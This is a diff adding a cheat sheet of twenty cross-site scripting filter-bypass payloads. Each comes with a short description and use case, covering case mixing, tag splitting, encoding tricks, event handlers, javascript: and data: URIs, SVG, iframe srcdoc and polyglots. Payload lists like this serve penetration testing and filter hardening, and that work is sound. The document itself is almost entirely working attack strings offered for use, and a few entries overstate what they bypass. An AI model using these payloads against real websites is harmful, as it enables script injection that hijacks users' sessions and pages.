@@ -1,0 +1,123 @@
+# XSS Filter Bypass Payloads (Advanced)
+
+----------------------------------------
+1. Case Bypass
+Payload: <ScRiPt>alert(1)</sCrIpT>
+Description: Uses mixed case to bypass case-sensitive filters.
+Use Case: Weak filters that only block lowercase <script>.
+
+----------------------------------------
+2. Script Tag Split
+Payload: <scr<script>ipt>alert(1)</script>
+Description: Breaks keyword into parts.
+Use Case: Bypass keyword-based filtering.
+
+----------------------------------------
+3. Encoded Characters
+Payload: <script>alert(String.fromCharCode(88,83,83))</script>
+Description: Encodes "XSS" in char codes.
+Use Case: Avoid keyword detection (alert, XSS).
+
+----------------------------------------
+4. Base64 Encoding
+Payload: <script>eval(atob('YWxlcnQoMSk='))</script>
+Description: Encoded payload execution.
+Use Case: Bypass filters blocking keywords.
+
+----------------------------------------
+5. HTML Entity Encoding
+Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+Description: Uses HTML encoding.
+Use Case: Works in improperly decoded inputs.
+
+----------------------------------------
+6. URL Encoding
+Payload: %3Cscript%3Ealert(1)%3C/script%3E
+Description: URL encoded payload.
+Use Case: Works in GET/POST parameters.
+
+----------------------------------------
+7. Double Encoding
+Payload: %253Cscript%253Ealert(1)%253C/script%253E
+Description: Encoded twice.
+Use Case: Bypass filters decoding only once.
+
+----------------------------------------
+8. Attribute Injection
+Payload: "><script>alert(1)</script>
+Description: Breaks out of HTML attribute.
+Use Case: Common in input fields inside tags.
+
+----------------------------------------
+9. JavaScript URI
+Payload: javascript:alert(1)
+Description: Executes via URL scheme.
+Use Case: Works in href/src attributes.
+
+----------------------------------------
+10. Data URI
+Payload: data:text/html,<script>alert(1)</script>
+Description: Inline HTML execution.
+Use Case: Bypass filters blocking direct scripts.
+
+----------------------------------------
+11. SVG Bypass
+Payload: <svg><script>alert(1)</script></svg>
+Description: Script inside SVG.
+Use Case: Bypass filters ignoring SVG content.
+
+----------------------------------------
+12. Event Handler Bypass
+Payload: <img src=x onerror=alert(1)>
+Description: Uses event instead of script tag.
+Use Case: When <script> is blocked.
+
+----------------------------------------
+13. Null Byte Injection
+Payload: <script%00>alert(1)</script>
+Description: Inserts null byte.
+Use Case: Bypass poorly implemented filters.
+
+----------------------------------------
+14. Comment Injection
+Payload: <script><!-- -->alert(1)</script>
+Description: Uses HTML comments.
+Use Case: Breaks naive pattern matching.
+
+----------------------------------------
+15. Whitespace Bypass
+Payload: <script >alert(1)</script >
+Description: Extra spaces in tags.
+Use Case: Bypass strict matching filters.
+
+----------------------------------------
+16. DOM-Based XSS
+Payload: <script>document.write(location.hash)</script>
+Description: Uses client-side execution.
+Use Case: Exploits unsafe JS in frontend.
+
+----------------------------------------
+17. Template Injection Style
+Payload: ${alert(1)}
+Description: Template literal execution.
+Use Case: Works in JS template rendering.
+
+----------------------------------------
+18. Polyglot Payload
+Payload: "><svg/onload=alert(1)>
+Description: Works in multiple contexts.
+Use Case: Unknown injection points.
+
+----------------------------------------
+19. iframe srcdoc
+Payload: <iframe srcdoc="<script>alert(1)</script>"></iframe>
+Description: Injects HTML via srcdoc.
+Use Case: Advanced bypass technique.
+
+----------------------------------------
+20. Broken Tag Injection
+Payload: <img src=x onerror=alert(1)//
+Description: Unclosed syntax.
+Use Case: Bypass parsers expecting proper syntax.
+
+----------------------------------------
